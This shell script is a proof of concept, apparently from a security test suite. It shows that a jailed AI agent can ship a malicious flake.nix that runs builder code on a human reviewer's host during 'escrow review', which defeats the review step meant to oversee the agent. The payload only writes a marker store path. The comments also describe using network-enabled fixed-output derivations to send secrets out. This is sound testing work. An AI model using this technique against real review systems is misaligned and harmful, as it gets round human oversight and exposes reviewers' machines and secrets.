#!/bin/sh
# PoC: `escrow review` executes agent-controlled Nix builders on the
# reviewer's host. The agent (controls the change set) ships a flake.nix
# whose nixosConfigurations.<cfg>.config.system.build.toplevel is an
# attacker derivation. closure.c builds it at review time (src/closure.c
# build()/closure_diff). The nix sandbox contains fs writes, but:
#   - arbitrary builder code runs on the reviewer/signer host just from
#     looking at the proposal (review is not read-only), and
#   - a fixed-output derivation is granted network access by Nix even under
#     sandbox=true, i.e. an exfiltration / SSRF channel from the review host.
# This PoC proves code execution with a harmless, offline, in-sandbox builder
# that drops a uniquely named store path. No network is used.
#
# usage: tests/escape/poc/closure-review-rce.sh /abs/escrow /abs/policy
set -eu
escrow=${1:?usage: $0 /abs/escrow /abs/policy}
policy=${2:?usage: $0 /abs/escrow /abs/policy}
[ "$(id -u)" -ne 0 ] || { echo "run as non-root"; exit 0; }
sys=$(nix eval --impure --raw --expr builtins.currentSystem)
nonce=$(date +%s)-$$
evil="escrow-REVIEW-RCE-$nonce"

tmp=$(mktemp -d)
trap 'chmod -R u+rwx "$tmp" 2>/dev/null; rm -rf "$tmp"' EXIT
cd "$tmp"
export ESCROW_STATE=$tmp/state ESCROW_ROLES=$tmp/roles
pub() { cut -d' ' -f1,2 "$1.pub"; }
for u in alice bob carol; do ssh-keygen -q -t ed25519 -N '' -C "$u" -f "$u"; done
{ echo "alice requester $(pub alice)"
  echo "bob reviewer $(pub bob)"
  echo "carol signer $(pub carol)"; } > roles

# Base workspace: a benign flake the org already trusts.
mkdir ws
cat > ws/flake.nix <<EOF
{
  outputs = { self }: {
    nixosConfigurations.poc.config.system.build.toplevel =
      derivation {
        name = "escrow-base-benign";
        system = "$sys";
        builder = "/bin/sh";
        args = [ "-c" "echo benign > \$out" ];
      };
  };
}
EOF

# The agent, inside the jail, rewrites flake.nix so the proposed toplevel is
# an attacker derivation. (A real attacker's builder would curl out a secret;
# a fixed-output derivation has network even under the nix sandbox.)
"$escrow" --role "$policy" --workspace ws --key alice --state state -- \
  /bin/sh -c "cat > flake.nix <<EOF
{
  outputs = { self }: {
    nixosConfigurations.poc.config.system.build.toplevel =
      derivation {
        name = \"$evil\";
        system = \"$sys\";
        builder = \"/bin/sh\";
        args = [ \"-c\" \"echo PWNED-DURING-REVIEW > \\\$out\" ];
      };
  };
}
EOF" >/dev/null 2>run.err
id=$("$escrow" list | tail -n1 | cut -d' ' -f1)
echo "proposal: $id  (agent-controlled flake.nix in the change set)"

# A store path with our nonce must not already exist.
if ls -d /nix/store/*"$evil" >/dev/null 2>&1; then
  echo "unexpected: artifact already in store before review"; exit 1
fi

echo "--- running: escrow review $id (no key: just looking) ---"
"$escrow" review "$id" >review.out 2>&1 || true

if ls -d /nix/store/*"$evil" >/dev/null 2>&1; then
  echo
  echo "POPPED: the agent's builder ran during 'escrow review'."
  echo "        store artifact created at review time:"
  ls -d /nix/store/*"$evil"
  echo "        content: $(cat /nix/store/*"$evil")"
  exit 0
else
  echo "not reproduced; review output tail:"; tail -8 review.out; exit 1
fi
